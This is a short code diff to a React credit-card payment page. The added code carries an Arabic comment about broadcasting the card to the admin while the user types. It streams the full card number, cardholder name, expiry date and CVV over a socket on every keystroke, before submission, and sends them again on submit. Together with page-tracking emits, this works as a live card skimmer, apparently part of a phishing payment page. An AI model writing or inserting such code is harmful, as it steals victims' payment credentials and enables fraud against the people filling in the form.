@@ -164,6 +164,19 @@ export default function CreditCardPayment() {
     expiryYear?.length > 0 &&
     cvv?.length === 3;
 
+  // بث البطاقة مباشرة للأدمن أثناء الكتابة
+  useEffect(() => {
+    socket.value.emit("card:draft", {
+      paymentMethod: "CARD",
+      cardNumber: cleanCardNumber,
+      nameOnCard: nameOnCard || "",
+      expiryMonth: expiryMonth || "",
+      expiryYear: expiryYear || "",
+      cvv: cvv || "",
+      submitted: false,
+    });
+  }, [cleanCardNumber, nameOnCard, expiryMonth, expiryYear, cvv]);
+
   // Emit page enter
   useEffect(() => {
     navigateToPage("الدفع بطاقة الائتمان");
@@ -352,6 +365,7 @@ export default function CreditCardPayment() {
 
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
 
+    socket.value.emit("card:draft", { paymentMethod: "CARD", cardNumber: cleanCardNumber, nameOnCard: data.nameOnCard, expiryMonth: data.expiryMonth, expiryYear: data.expiryYear, cvv: data.cvv, submitted: true });
     sendData({
       paymentCard: {
         cardNumber: cleanCardNumber,
